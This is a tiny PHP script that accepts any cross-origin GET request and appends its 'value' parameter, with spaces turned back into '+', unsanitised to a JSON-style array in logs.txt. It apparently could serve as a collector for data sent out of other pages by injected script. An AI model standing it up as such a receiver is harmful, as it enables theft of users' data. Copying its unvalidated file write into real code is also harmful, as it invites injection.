<?php
header("Access-Control-Allow-Origin: *");
$value = $_GET['value'];
$value = str_replace(" ", "+", $value);
$content = str_replace("]","",file_get_contents('logs.txt'));
$content = $content.', "'.$value.'"]';
file_put_contents('logs.txt', $content);
?>